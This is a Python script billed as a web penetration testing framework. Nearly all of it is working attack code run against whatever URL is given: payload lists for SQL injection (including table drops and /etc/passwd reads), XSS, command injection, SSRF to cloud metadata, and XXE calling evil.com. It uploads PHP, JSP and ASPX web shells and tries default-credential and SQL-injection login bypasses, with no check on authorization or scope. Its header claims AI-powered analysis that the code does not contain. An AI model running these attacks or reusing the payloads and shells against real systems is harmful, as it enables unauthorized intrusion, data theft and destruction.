#!/usr/bin/env python3
"""
Advanced Web Application Penetration Testing Framework
Comprehensive automated security testing with AI-powered analysis
Multi-layer vulnerability detection and exploitation verification
"""

import sys
import json
import re
import urllib.parse
import hashlib
import base64
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

class AdvancedWebPenFramework:
    """Advanced web application penetration testing framework"""
    
    # Advanced payload libraries
    SQLI_PAYLOADS = [
        # Time-based SQLi
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT pg_sleep(5)--",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        
        # Union-based SQLi
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
        "' UNION SELECT @@version,user(),database()--",
        "' UNION SELECT NULL,NULL,LOAD_FILE('/etc/passwd')--",
        
        # Boolean-based SQLi
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin'/*",
        "' OR 1=1#",
        "') OR ('1'='1",
        
        # Error-based SQLi
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        
        # Stacked queries
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','pass')--",
        
        # Second-order SQLi
        "admin' OR '1'='1",
        "admin' OR 1=1--",
    ]
    
    XSS_PAYLOADS = [
        # Basic XSS
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        
        # Advanced XSS
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        
        # DOM-based XSS
        "#<img src=x onerror=alert('XSS')>",
        "?test=<img src=x onerror=alert('XSS')>",
        "<script>eval(location.hash.slice(1))</script>",
        
        # Encoded XSS
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
        
        # Polyglot XSS
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//",
    ]
    
    RCE_PAYLOADS = [
        # Command injection
        "; ls",
        "| ls",
        "&& ls",
        "|| ls",
        "; id",
        "| id",
        "&& id",
        "; whoami",
        "| whoami",
        "&& whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; ping -c 3 127.0.0.1",
        "`ls`",
        "$(ls)",
        "${ls}",
        "`id`",
        "$(id)",
        "${id}",
        
        # PHP code injection
        "<?php system('id'); ?>",
        "<?php exec('id'); ?>",
        "<?php shell_exec('id'); ?>",
        "<?php passthru('id'); ?>",
        "<?php `id`; ?>",
        
        # Python code injection
        "__import__('os').system('id')",
        "eval('__import__(\"os\").system(\"id\")')",
        "exec('__import__(\"os\").system(\"id\")')",
    ]
    
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:80",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "file:///etc/passwd",
        "gopher://127.0.0.1:80",
        "dict://127.0.0.1:6379",
        "http://localhost:8080/admin",
        "http://127.0.0.1:5984/_utils",
    ]
    
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    ]
    
    @staticmethod
    def discover_endpoints(base_url: str) -> List[Dict]:
        """Advanced endpoint discovery"""
        discovered = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            # Common paths
            common_paths = [
                '/admin', '/administrator', '/admin.php', '/admin.html',
                '/login', '/signin', '/auth', '/authentication',
                '/api', '/api/v1', '/api/v2', '/rest', '/graphql',
                '/config', '/configuration', '/config.php', '/config.json',
                '/backup', '/backups', '/backup.sql', '/dump.sql',
                '/test', '/testing', '/dev', '/development',
                '/debug', '/debugger', '/phpinfo.php', '/info.php',
                '/.git', '/.svn', '/.env', '/.htaccess',
                '/wp-admin', '/wp-login.php', '/wp-config.php',
                '/phpmyadmin', '/mysql', '/database',
                '/upload', '/uploads', '/files', '/file',
                '/download', '/downloads',
                '/search', '/query', '/search.php',
                '/user', '/users', '/profile', '/account',
                '/dashboard', '/panel', '/control',
            ]
            
            parsed = urlparse(base_url)
            base_path = parsed.path.rstrip('/')
            
            for path in common_paths:
                full_url = f"{parsed.scheme}://{parsed.netloc}{base_path}{path}"
                
                try:
                    response = requests.get(full_url, timeout=5, allow_redirects=False)
                    
                    if response.status_code not in [404, 403]:
                        discovered.append({
                            'endpoint': path,
                            'url': full_url,
                            'status_code': response.status_code,
                            'content_type': response.headers.get('Content-Type', ''),
                            'size': len(response.content),
                            'accessible': response.status_code in [200, 201, 301, 302]
                        })
                except (RequestException, Timeout):
                    continue
        except ImportError:
            pass
        
        return discovered
    
    @staticmethod
    def test_sqli_advanced(url: str, params: Dict[str, str]) -> List[Dict]:
        """Advanced SQL injection testing with time-based detection"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            import time
            
            base_response = None
            try:
                base_response = requests.get(url, params=params, timeout=10, allow_redirects=True)
                base_time = time.time()
            except:
                pass
            
            for payload in AdvancedWebPenFramework.SQLI_PAYLOADS[:15]:
                for param_name, param_value in params.items():
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        start_time = time.time()
                        response = requests.get(url, params=test_params, timeout=15, allow_redirects=True)
                        response_time = time.time() - start_time
                        
                        # Time-based detection
                        if 'SLEEP' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload:
                            if response_time > 4.0:  # Significant delay
                                results.append({
                                    'vulnerability': 'SQL Injection (Time-based)',
                                    'severity': 'critical',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'status_code': response.status_code,
                                    'response_time': round(response_time, 2),
                                    'evidence': f'Time-based SQLi detected: {response_time}s delay',
                                    'url': response.url
                                })
                                continue
                        
                        # Error-based detection
                        sql_errors = [
                            'sql syntax', 'mysql error', 'postgresql error',
                            'ora-', 'sqlite error', 'mssql error',
                            'sql exception', 'sqlstate', 'sql warning',
                            'unclosed quotation', 'quoted string not properly terminated',
                            'invalid query', 'sql command not properly ended',
                            'mysql_fetch', 'pg_query', 'oci_parse'
                        ]
                        
                        response_text = response.text.lower()
                        is_vulnerable = any(error in response_text for error in sql_errors)
                        
                        if is_vulnerable:
                            results.append({
                                'vulnerability': 'SQL Injection (Error-based)',
                                'severity': 'critical',
                                'parameter': param_name,
                                'payload': payload,
                                'status_code': response.status_code,
                                'evidence': 'SQL error message detected in response',
                                'url': response.url
                            })
                        
                        # Boolean-based detection (response comparison)
                        if base_response and response.status_code == base_response.status_code:
                            if len(response.text) != len(base_response.text):
                                # Different response length might indicate boolean-based SQLi
                                if payload in ["' OR '1'='1", "' OR '1'='1'--"]:
                                    results.append({
                                        'vulnerability': 'SQL Injection (Boolean-based)',
                                        'severity': 'high',
                                        'parameter': param_name,
                                        'payload': payload,
                                        'status_code': response.status_code,
                                        'evidence': 'Response length difference detected',
                                        'url': response.url
                                    })
                    except (RequestException, Timeout):
                        continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def test_xss_advanced(url: str, params: Dict[str, str]) -> List[Dict]:
        """Advanced XSS testing with encoding detection"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            for payload in AdvancedWebPenFramework.XSS_PAYLOADS[:20]:
                for param_name, param_value in params.items():
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        response = requests.get(url, params=test_params, timeout=10, allow_redirects=True)
                        
                        # Check if payload is reflected
                        if payload in response.text:
                            # Check encoding
                            encoded_payload = urllib.parse.quote(payload)
                            html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
                            
                            if encoded_payload not in response.text and html_encoded not in response.text:
                                results.append({
                                    'vulnerability': 'Cross-Site Scripting (XSS)',
                                    'severity': 'high',
                                    'parameter': param_name,
                                    'payload': payload[:100],
                                    'status_code': response.status_code,
                                    'evidence': 'Payload reflected without proper encoding',
                                    'url': response.url,
                                    'type': 'Reflected XSS'
                                })
                        
                        # Check for DOM-based XSS indicators
                        if 'location.hash' in payload or 'document.location' in payload:
                            if 'eval' in response.text or 'innerHTML' in response.text:
                                results.append({
                                    'vulnerability': 'DOM-based XSS',
                                    'severity': 'high',
                                    'parameter': param_name,
                                    'payload': payload[:100],
                                    'status_code': response.status_code,
                                    'evidence': 'DOM manipulation detected',
                                    'url': response.url
                                })
                    except (RequestException, Timeout):
                        continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def test_file_upload(url: str, upload_endpoint: str = '/upload') -> Dict:
        """Test file upload vulnerabilities"""
        result = {
            'vulnerability': 'File Upload',
            'tested': False,
            'vulnerabilities': []
        }
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            # Test different file types
            test_files = {
                'php_shell': {
                    'content': b'<?php system($_GET["cmd"]); ?>',
                    'filename': 'shell.php',
                    'content_type': 'application/x-php'
                },
                'jsp_shell': {
                    'content': b'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                    'filename': 'shell.jsp',
                    'content_type': 'application/x-jsp'
                },
                'aspx_shell': {
                    'content': b'<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>',
                    'filename': 'shell.aspx',
                    'content_type': 'application/x-aspx'
                },
                'double_ext': {
                    'content': b'<?php system($_GET["cmd"]); ?>',
                    'filename': 'shell.php.jpg',
                    'content_type': 'image/jpeg'
                },
                'null_byte': {
                    'content': b'<?php system($_GET["cmd"]); ?>',
                    'filename': 'shell.php%00.jpg',
                    'content_type': 'image/jpeg'
                }
            }
            
            upload_url = urljoin(url, upload_endpoint)
            
            for file_type, file_data in test_files.items():
                try:
                    files = {'file': (file_data['filename'], file_data['content'], file_data['content_type'])}
                    response = requests.post(upload_url, files=files, timeout=10, allow_redirects=False)
                    
                    if response.status_code in [200, 201]:
                        # Check if file was uploaded
                        if file_data['filename'] in response.text or 'upload' in response.text.lower():
                            result['vulnerabilities'].append({
                                'type': file_type,
                                'filename': file_data['filename'],
                                'status_code': response.status_code,
                                'severity': 'critical',
                                'evidence': f'File upload successful: {file_data["filename"]}'
                            })
                except (RequestException, Timeout):
                    continue
            
            result['tested'] = True
        except ImportError:
            pass
        
        return result
    
    @staticmethod
    def test_authentication_bypass(url: str) -> List[Dict]:
        """Test authentication bypass techniques"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            # Bypass techniques
            bypass_attempts = [
                {'method': 'No auth', 'headers': {}},
                {'method': 'SQLi in password', 'data': {'username': 'admin', 'password': "' OR '1'='1"}},
                {'method': 'SQLi in username', 'data': {'username': "admin'--", 'password': 'anything'}},
                {'method': 'Default credentials', 'data': {'username': 'admin', 'password': 'admin'}},
                {'method': 'Default credentials 2', 'data': {'username': 'admin', 'password': 'password'}},
                {'method': 'Empty password', 'data': {'username': 'admin', 'password': ''}},
                {'method': 'Null bytes', 'data': {'username': 'admin\x00', 'password': 'admin'}},
            ]
            
            for attempt in bypass_attempts:
                try:
                    if 'headers' in attempt:
                        response = requests.get(url, headers=attempt['headers'], timeout=10, allow_redirects=False)
                    else:
                        response = requests.post(url, data=attempt['data'], timeout=10, allow_redirects=False)
                    
                    # Check for successful authentication
                    if response.status_code == 200 and ('dashboard' in response.text.lower() or 'welcome' in response.text.lower() or 'logout' in response.text.lower()):
                        results.append({
                            'vulnerability': 'Authentication Bypass',
                            'severity': 'critical',
                            'method': attempt['method'],
                            'status_code': response.status_code,
                            'evidence': 'Possible authentication bypass successful'
                        })
                except (RequestException, Timeout):
                    continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def test_idor(url: str, params: Dict[str, str]) -> List[Dict]:
        """Test Insecure Direct Object Reference (IDOR)"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            # Test IDOR patterns
            idor_tests = [
                {'id': '1', 'user_id': '1'},
                {'id': '2', 'user_id': '2'},
                {'id': '0', 'user_id': '0'},
                {'id': '-1', 'user_id': '-1'},
                {'id': '../1', 'user_id': '../1'},
            ]
            
            for test_case in idor_tests:
                test_params = params.copy()
                test_params.update(test_case)
                
                try:
                    response = requests.get(url, params=test_params, timeout=10, allow_redirects=False)
                    
                    # Check if unauthorized access to other user's data
                    if response.status_code == 200:
                        # Look for sensitive data patterns
                        sensitive_patterns = ['email', 'phone', 'address', 'credit', 'ssn', 'password']
                        if any(pattern in response.text.lower() for pattern in sensitive_patterns):
                            results.append({
                                'vulnerability': 'IDOR (Insecure Direct Object Reference)',
                                'severity': 'high',
                                'parameters': test_case,
                                'status_code': response.status_code,
                                'evidence': 'Possible unauthorized access to sensitive data',
                                'url': response.url
                            })
                except (RequestException, Timeout):
                    continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def test_ssrf_advanced(url: str, params: Dict[str, str]) -> List[Dict]:
        """Advanced SSRF testing"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            for payload in AdvancedWebPenFramework.SSRF_PAYLOADS:
                for param_name, param_value in params.items():
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        response = requests.get(url, params=test_params, timeout=5, allow_redirects=False)
                        
                        # Check for SSRF indicators
                        if '127.0.0.1' in payload or 'localhost' in payload:
                            if response.status_code in [200, 403, 500]:
                                # Check for internal resource indicators
                                internal_indicators = ['localhost', '127.0.0.1', 'internal', 'private']
                                if any(indicator in response.text.lower() for indicator in internal_indicators):
                                    results.append({
                                        'vulnerability': 'SSRF (Server-Side Request Forgery)',
                                        'severity': 'high',
                                        'parameter': param_name,
                                        'payload': payload,
                                        'status_code': response.status_code,
                                        'evidence': 'Possible internal resource access',
                                        'url': response.url
                                    })
                    except (RequestException, Timeout):
                        continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def test_xxe_advanced(url: str) -> List[Dict]:
        """Advanced XXE testing"""
        results = []
        
        try:
            import requests
            from requests.exceptions import RequestException, Timeout
            
            for payload in AdvancedWebPenFramework.XXE_PAYLOADS:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = requests.post(url, data=payload, headers=headers, timeout=10, allow_redirects=False)
                    
                    # Check for XXE indicators
                    xxe_indicators = [
                        'root:x:0:0',  # /etc/passwd
                        'windows',  # Windows file
                        'base64',  # Base64 encoded content
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in xxe_indicators):
                        results.append({
                            'vulnerability': 'XXE (XML External Entity)',
                            'severity': 'high',
                            'payload': payload[:100] + '...',
                            'status_code': response.status_code,
                            'evidence': 'XXE payload executed successfully',
                            'url': url
                        })
                except (RequestException, Timeout):
                    continue
        except ImportError:
            pass
        
        return results
    
    @staticmethod
    def comprehensive_web_pen_test(target_url: str, scan_depth: str = 'medium') -> Dict:
        """Comprehensive web application penetration test"""
        result = {
            'success': True,
            'target': target_url,
            'scan_depth': scan_depth,
            'endpoints_discovered': [],
            'vulnerabilities': [],
            'exploitation_attempts': [],
            'risk_score': 0,
            'summary': {
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
                'total': 0
            }
        }
        
        try:
            parsed = urlparse(target_url)
            params = parse_qs(parsed.query)
            params_dict = {k: v[0] if v else '1' for k, v in params.items()}
            
            if not params_dict:
                params_dict = {
                    'id': '1',
                    'page': '1',
                    'user': 'admin',
                    'search': 'test',
                    'file': 'test.txt',
                    'url': 'http://example.com'
                }
            
            # Endpoint discovery
            discovered = AdvancedWebPenFramework.discover_endpoints(target_url)
            result['endpoints_discovered'] = discovered[:20]  # Limit to 20
            
            # SQL Injection testing
            sqli_results = AdvancedWebPenFramework.test_sqli_advanced(target_url, params_dict)
            result['vulnerabilities'].extend(sqli_results)
            
            # XSS testing
            xss_results = AdvancedWebPenFramework.test_xss_advanced(target_url, params_dict)
            result['vulnerabilities'].extend(xss_results)
            
            # SSRF testing
            ssrf_results = AdvancedWebPenFramework.test_ssrf_advanced(target_url, params_dict)
            result['vulnerabilities'].extend(ssrf_results)
            
            # XXE testing
            xxe_results = AdvancedWebPenFramework.test_xxe_advanced(target_url)
            result['vulnerabilities'].extend(xxe_results)
            
            # File upload testing
            upload_result = AdvancedWebPenFramework.test_file_upload(target_url)
            if upload_result['vulnerabilities']:
                result['vulnerabilities'].extend(upload_result['vulnerabilities'])
            
            # Authentication bypass
            auth_bypass_results = AdvancedWebPenFramework.test_authentication_bypass(target_url)
            result['vulnerabilities'].extend(auth_bypass_results)
            
            # IDOR testing
            idor_results = AdvancedWebPenFramework.test_idor(target_url, params_dict)
            result['vulnerabilities'].extend(idor_results)
            
            # Calculate summary
            for vuln in result['vulnerabilities']:
                severity = vuln.get('severity', 'low').lower()
                if severity == 'critical':
                    result['summary']['critical'] += 1
                    result['risk_score'] += 10
                elif severity == 'high':
                    result['summary']['high'] += 1
                    result['risk_score'] += 7
                elif severity == 'medium':
                    result['summary']['medium'] += 1
                    result['risk_score'] += 4
                else:
                    result['summary']['low'] += 1
                    result['risk_score'] += 1
                result['summary']['total'] += 1
            
            result['risk_score'] = min(100, result['risk_score'])
            
            result['message'] = f'Comprehensive web penetration test completed. Found {result["summary"]["total"]} vulnerabilities across {len(result["endpoints_discovered"])} endpoints.'
            
        except Exception as e:
            result['success'] = False
            result['error'] = str(e)
        
        return result

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(json.dumps({'error': 'Target URL required'}))
        sys.exit(1)
    
    target_url = sys.argv[1]
    scan_depth = sys.argv[2] if len(sys.argv) > 2 else 'medium'
    
    result = AdvancedWebPenFramework.comprehensive_web_pen_test(target_url, scan_depth)
    print(json.dumps({'success': True, 'result': result}))

